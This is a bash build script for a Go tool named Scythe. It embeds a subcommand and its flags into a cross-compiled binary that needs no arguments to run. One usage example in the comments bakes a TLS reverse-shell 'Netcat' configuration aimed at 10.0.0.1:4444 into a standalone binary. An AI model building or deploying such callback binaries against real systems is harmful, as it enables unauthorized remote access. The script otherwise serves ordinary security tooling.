#!/usr/bin/env bash
# Build Scythe with subcommand and flags baked in. The resulting binary needs no CLI arguments:
#   ./Scythe.embedded
#
# Usage:
#   ./scripts/build-embedded.sh '["SUBCOMMAND","-flag","value",...]' [output-path] [target-os] [target-arch]
#
# target-os (optional): linux | windows | darwin — cross-compile for that OS.
# target-arch (optional): defaults to amd64 when cross-compiling; see map_arch below.
#   Omit both to build natively for the machine you run this script on.
#
# Examples:
#   ./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]'
#   ./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./nc.bin linux
#   ./scripts/build-embedded.sh '["Http",...]' ./Scythe.exe windows x86_64
#   ./scripts/build-embedded.sh '["Proxy","-port","9050"]' ./Scythe.arm64 darwin arm64
#
set -euo pipefail

# Map common names to Go's GOARCH (https://go.dev/doc/install/source#environment).
# Unknown but alphanumeric names pass through so power users can set e.g. riscv64.
map_arch() {
	local a
	a=$(echo "$1" | tr '[:upper:]' '[:lower:]')
	case "$a" in
	amd64 | x86_64 | x64) echo amd64 ;;
	386 | x86 | i386 | i686) echo 386 ;;
	arm | armv7 | armv7l) echo arm ;;
	arm64 | aarch64) echo arm64 ;;
	riscv64) echo riscv64 ;;
	ppc64le) echo ppc64le ;;
	*)
		if [[ "$a" =~ ^[a-z0-9]+$ ]]; then
			echo "$a"
		else
			echo ""
		fi
		;;
	esac
}

if [[ $# -lt 1 ]]; then
	echo "Usage: $0 'JSON_ARRAY_OF_ARGS' [output-binary] [linux|windows|darwin] [arch]" >&2
	echo "Arch aliases: x86_64/amd64, x86/386, arm, arm64/aarch64, ..." >&2
	echo "Example: $0 '[\"Http\",\"-url\",\"https://x\",\"-timeout\",\"10s\"]' ./Scythe.exe windows x86_64" >&2
	exit 1
fi

JSON="$1"
OUT="${2:-./Scythe.embedded}"
TARGET_RAW="${3:-}"
ARCH_RAW="${4:-}"

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
B64="$(printf '%s' "$JSON" | base64 | tr -d '\n')"

TARGET=$(echo "$TARGET_RAW" | tr '[:upper:]' '[:lower:]')
if [[ -n "$ARCH_RAW" && -z "$TARGET" ]]; then
	echo "Specify target OS (third argument) before architecture (fourth argument)." >&2
	exit 1
fi

if [[ -n "$TARGET" ]]; then
	export CGO_ENABLED=0
	case "$TARGET" in
	linux) export GOOS=linux ;;
	windows) export GOOS=windows ;;
	darwin | macos) export GOOS=darwin ;;
	*)
		echo "Invalid target OS: ${TARGET_RAW} — use linux, windows, or darwin (or macos for Darwin)." >&2
		exit 1
		;;
	esac

	if [[ -n "$ARCH_RAW" ]]; then
		MAPPED=$(map_arch "$ARCH_RAW")
		if [[ -z "$MAPPED" ]]; then
			echo "Invalid target architecture: ${ARCH_RAW} — try amd64, x86_64, 386, x86, arm, arm64, aarch64, ..." >&2
			exit 1
		fi
		export GOARCH="$MAPPED"
	else
		export GOARCH="${GOARCH:-amd64}"
	fi
fi

cd "$ROOT"
go build -trimpath \
	-ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
	-o "$OUT" ./cmd

if [[ -n "$TARGET" ]]; then
	echo "Built ${OUT} for GOOS=${GOOS} GOARCH=${GOARCH} (embedded argv; run on that platform with no args)"
else
	echo "Built ${OUT} for native $(go env GOOS)/$(go env GOARCH) (embedded argv; run with no args to use it)"
fi
